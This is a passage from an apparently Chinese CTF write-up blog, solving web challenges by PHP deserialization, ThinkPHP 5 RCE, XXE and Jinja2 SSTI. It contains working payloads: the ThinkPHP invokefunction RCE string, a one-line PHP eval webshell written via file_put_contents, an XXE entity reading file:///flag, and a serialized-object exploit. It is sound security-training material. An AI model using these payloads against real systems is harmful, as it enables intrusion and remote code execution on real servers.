class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"Pk very safe^.^\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">acp</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$cinder</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$neutron</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nova</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ace</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span><span class=\"token operator\">-></span><span class=\"token function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ace</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'../nssctfasdasdflag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$openstack</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$docker</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">docker</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">neutron</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$heat</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">neutron</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">nova</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"./<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">&#125;</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"keystone lost~\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">acp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><blockquote>\n<p>?pks=O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A19%3A%22..%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D</p>\n</blockquote>\n<p>这样就拿到 flag 了.</p>\n<h2 id=\"2023930\"><a class=\"anchor\" href=\"#2023930\">#</a> 2023/9/30</h2>\n<h3 id=\"swpuctf-2022-新生赛ez_rce\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛ez_rce\">#</a> [SWPUCTF 2022 新生赛] ez_rce</h3>\n<h4 id=\"rcethinkphpphp命令执行\"><a class=\"anchor\" href=\"#rcethinkphpphp命令执行\">#</a> RCE,thinkphp,PHP，命令执行</h4>\n<p>打开题目：</p>\n<blockquote>\n<p>真的什么都没有吗？</p>\n</blockquote>\n<p>扫一下，扫到 robots.txt, 打开看看：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">User-agent</span><span class=\"token punctuation\">:</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token property\">Disallow</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token operator\">-</span>  /NSS/index.php/</pre></td></tr></table></figure><p>打开 / NSS/index.php/</p>\n<p>看到 thinkphp v5，不出意外这是一个老 cve 了，</p>\n<p>可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZZMTAwMzMvYXJ0aWNsZS9kZXRhaWxzLzEyNDU4MDEzMT9vcHNfcmVxdWVzdF9taXNjPSUyNTdCJTI1MjJyZXF1ZXN0JTI1NUZpZCUyNTIyJTI1M0ElMjUyMjE2OTY0MTIwNDAxNjgwMDIyNzQ5NTAzNyUyNTIyJTI1MkMlMjUyMnNjbSUyNTIyJTI1M0ElMjUyMjIwMTQwNzEzLjEzMDEwMjMzNC4uJTI1MjIlMjU3RCZhbXA7cmVxdWVzdF9pZD0xNjk2NDEyMDQwMTY4MDAyMjc0OTUwMzcmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfcG9zaXRpdmV+ZGVmYXVsdC0xLTEyNDU4MDEzMS1udWxsLW51bGwuMTQyJTVFdjk0JTVFaW5zZXJ0X2Rvd24xJmFtcDt1dG1fdGVybT10aGlua3BocCVFNiVCQyU4RiVFNiVCNCU5RSZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQxODc=\">ThinkPHP 漏洞大全</span></p>\n<p>既然版本号是 5.0，那就用那个通杀<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1SQ0UmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\"> RCE</span>-payload 试试</p>\n<blockquote>\n<p>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</p>\n</blockquote>\n<p>发现回显出：www-data 。说明能用，那就用那个上传木马文件的</p>\n<blockquote>\n<p>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=12345.php&amp;vars[1][1]=&lt;?php @eval($_POST[shell]); ?&gt;</p>\n</blockquote>\n<p>访问：/NSS/12345.php</p>\n<p>用蚁剑连接，在 /nss/ctf/flag/flag 中找到。</p>\n<h2 id=\"2023123\"><a class=\"anchor\" href=\"#2023123\">#</a> 2023/12/3</h2>\n<h3 id=\"nctf-2019fake-xml-cookbook\"><a class=\"anchor\" href=\"#nctf-2019fake-xml-cookbook\">#</a> [NCTF 2019]Fake XML cookbook</h3>\n<h4 id=\"xxe代码审计\"><a class=\"anchor\" href=\"#xxe代码审计\">#</a> xxe, 代码审计</h4>\n<p>打开题目是一个登录框，用户名 admin，密码 123456 尝试，回显：</p>\n<blockquote>\n<p>&lt;br /&gt;<br />\n&lt;b&gt;Deprecated&lt;/b&gt;:  Function libxml_disable_entity_loader() is deprecated in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;11&lt;/b&gt;&lt;br /&gt;<br />\n&lt;br /&gt;<br />\n&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /var/www/html/doLogin.php:11) in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;31&lt;/b&gt;&lt;br /&gt;<br />\n&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;admin;&lt;/msg&gt;&lt;/result&gt;</p>\n</blockquote>\n<p>结合题目名称可以判断出是一道 xml 注入，具体可以参考以下：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjg4NyN0b2MtNQ==\">从 XML 相关一步一步到 XXE 漏洞</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8xNzU0NTEuaHRtbA==\">浅谈 XML 实体注入漏洞</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsZXhfYW5kcmEvYXJ0aWNsZS9kZXRhaWxzLzEwNTkyMzA0OQ==\">XXE 初识</span></p>\n<p>截包构造外部实体：</p>\n<figure class=\"highlight apl\"><figcaption data-lang=\"APL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>POST <span class=\"token monadic-operator operator\">/</span>doLogin<span class=\"token dyadic-operator operator\">.</span>php HTTP<span class=\"token monadic-operator operator\">/</span><span class=\"token number\">1.1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Host<span class=\"token dfn builtin\">:</span> node4<span class=\"token dyadic-operator operator\">.</span>anna<span class=\"token dyadic-operator operator\">.</span>nssctf<span class=\"token dyadic-operator operator\">.</span>cn<span class=\"token dfn builtin\">:</span><span class=\"token number\">28316</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>X<span class=\"token function\">-</span>Requested<span class=\"token function\">-</span>With<span class=\"token dfn builtin\">:</span> XMLHttpRequest</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Content<span class=\"token function\">-</span>Type<span class=\"token dfn builtin\">:</span> application<span class=\"token monadic-operator operator\">/</span>xml<span class=\"token punctuation\">;</span>charset<span class=\"token function\">=</span>UTF<span class=\"token function\">-</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Referer<span class=\"token dfn builtin\">:</span> http<span class=\"token dfn builtin\">:</span><span class=\"token monadic-operator operator\">/</span><span class=\"token monadic-operator operator\">/</span>node4<span class=\"token dyadic-operator operator\">.</span>anna<span class=\"token dyadic-operator operator\">.</span>nssctf<span class=\"token dyadic-operator operator\">.</span>cn<span class=\"token dfn builtin\">:</span><span class=\"token number\">28316</span><span class=\"token monadic-operator operator\">/</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>User<span class=\"token function\">-</span>Agent<span class=\"token dfn builtin\">:</span> Mozilla<span class=\"token monadic-operator operator\">/</span><span class=\"token number\">5.0</span> <span class=\"token punctuation\">(</span>Windows NT <span class=\"token number\">10.0</span><span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">)</span> AppleWebKit<span class=\"token monadic-operator operator\">/</span><span class=\"token number\">537.36</span> <span class=\"token punctuation\">(</span>KHTML<span class=\"token function\">,</span> like Gecko<span class=\"token punctuation\">)</span> Chrome<span class=\"token monadic-operator operator\">/</span><span class=\"token number\">119.0</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span> Safari<span class=\"token monadic-operator operator\">/</span><span class=\"token number\">537.36</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Accept<span class=\"token function\">-</span>Encoding<span class=\"token dfn builtin\">:</span> gzip<span class=\"token function\">,</span> deflate</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Accept<span class=\"token function\">-</span>Language<span class=\"token dfn builtin\">:</span> zh<span class=\"token function\">-</span>CN<span class=\"token function\">,</span>zh<span class=\"token punctuation\">;</span>q<span class=\"token function\">=</span><span class=\"token number\">0.9</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Accept<span class=\"token dfn builtin\">:</span> application<span class=\"token monadic-operator operator\">/</span>xml<span class=\"token function\">,</span> text<span class=\"token monadic-operator operator\">/</span>xml<span class=\"token function\">,</span> <span class=\"token function\">*</span><span class=\"token monadic-operator operator\">/</span><span class=\"token function\">*</span><span class=\"token punctuation\">;</span> q<span class=\"token function\">=</span><span class=\"token number\">0.01</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Origin<span class=\"token dfn builtin\">:</span> http<span class=\"token dfn builtin\">:</span><span class=\"token monadic-operator operator\">/</span><span class=\"token monadic-operator operator\">/</span>node4<span class=\"token dyadic-operator operator\">.</span>anna<span class=\"token dyadic-operator operator\">.</span>nssctf<span class=\"token dyadic-operator operator\">.</span>cn<span class=\"token dfn builtin\">:</span><span class=\"token number\">28316</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Content<span class=\"token function\">-</span>Length<span class=\"token dfn builtin\">:</span> <span class=\"token number\">65</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">&lt;</span><span class=\"token function\">?</span>xml version<span class=\"token function\">=</span>\"<span class=\"token number\">1.0</span>\" encoding<span class=\"token function\">=</span>\"utf<span class=\"token function\">-</span><span class=\"token number\">8</span>\"<span class=\"token function\">?</span><span class=\"token function\">></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">&lt;</span><span class=\"token function\">!</span>DOCTYPE not <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">&lt;</span><span class=\"token function\">!</span>ENTITY admin SYSTEM \"file<span class=\"token dfn builtin\">:</span><span class=\"token monadic-operator operator\">/</span><span class=\"token monadic-operator operator\">/</span><span class=\"token monadic-operator operator\">/</span>flag\"<span class=\"token function\">></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">]</span><span class=\"token function\">></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">&lt;</span>user<span class=\"token function\">></span><span class=\"token function\">&lt;</span>username<span class=\"token function\">></span><span class=\"token monadic-operator operator\">&amp;</span>admin<span class=\"token punctuation\">;</span><span class=\"token function\">&lt;</span><span class=\"token monadic-operator operator\">/</span>username<span class=\"token function\">></span><span class=\"token function\">&lt;</span>password<span class=\"token function\">></span><span class=\"token number\">3</span><span class=\"token function\">&lt;</span><span class=\"token monadic-operator operator\">/</span>password<span class=\"token function\">></span><span class=\"token function\">&lt;</span><span class=\"token monadic-operator operator\">/</span>user<span class=\"token function\">></span></pre></td></tr></table></figure><p>得到 flag</p>\n<h3 id=\"hnctf-2022-week2ez_ssti\"><a class=\"anchor\" href=\"#hnctf-2022-week2ez_ssti\">#</a> [HNCTF 2022 WEEK2]ez_SSTI</h3>\n<h4 id=\"sstiflaskpythonjinja2\"><a class=\"anchor\" href=\"#sstiflaskpythonjinja2\">#</a> SSTI,Flask,Python,Jinja2</h4>\n<p>简单的 Jinja2 注入，几乎没有过滤东西，</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/24.png\" alt=\"24\" /></p>\n<h3 id=\"gdouctf-2023反方向的钟\"><a class=\"anchor\" href=\"#gdouctf-2023反方向的钟\">#</a> [GDOUCTF 2023] 反方向的钟</h3>\n<h4 id=\"反序列化php伪协议php\"><a class=\"anchor\" href=\"#反序列化php伪协议php\">#</a> 反序列化，php 伪协议，php</h4>\n<p>进入题目提示：</p>\n<blockquote>\n<h6 id=\"you-can-not-see-me-but-you-can-see-me\"><a class=\"anchor\" href=\"#you-can-not-see-me-but-you-can-see-me\">#</a> you can not see me but you can see me</h6>\n</blockquote>\n<p>刷新试试：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// flag.php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">teacher</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$rank</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$salary</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$rank</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$salary</span> <span class=\"token operator\">=</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">rank</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$rank</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">salary</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$salary</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">classroom</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$leader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$leader</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">leader</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$leader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">hahaha</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'one class'</span> <span class=\"token keyword\">or</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">leader</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'ing'</span> <span class=\"token keyword\">or</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">leader</span><span class=\"token operator\">-></span><span class=\"token property\">rank</span> <span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'department'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">school</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$department</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$headmaster</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$department</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ceo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">department</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$department</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">headmaster</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$ceo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">IPO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">headmaster</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'ong'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Pretty Good ! Ctfer!\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token keyword\">new</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token 